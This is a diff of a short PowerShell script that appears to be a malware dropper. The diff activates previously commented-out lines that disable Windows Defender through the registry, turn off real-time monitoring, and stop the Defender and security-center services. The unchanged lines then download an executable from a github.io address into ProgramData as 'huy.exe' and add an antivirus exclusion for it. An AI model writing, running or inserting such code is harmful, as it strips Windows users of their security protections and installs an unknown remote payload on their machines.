@@ -1,10 +1,10 @@
 Import-Module BitsTransfer;
 
-# Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;
-# Set-MpPreference -DisableRealtimeMonitoring $true;
-# Set-Service -Name "wscsvc" -Status stopped -StartupType disabled;
-# Set-Service -Name "WinDefend" -Status stopped -StartupType disabled;
-# Set-Service -Name "SecurityHealthService" -Status stopped -StartupType disabled;
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1;
+Set-MpPreference -DisableRealtimeMonitoring $true;
+Set-Service -Name "wscsvc" -Status stopped -StartupType disabled;
+Set-Service -Name "WinDefend" -Status stopped -StartupType disabled;
+Set-Service -Name "SecurityHealthService" -Status stopped -StartupType disabled;
 Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.6.exe" -Destination "%ProgramData%\huy.exe";
 Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\huy.exe"
 $fileInfo = New-Object System.IO.FileInfo('%ProgramData%\huy.exe');
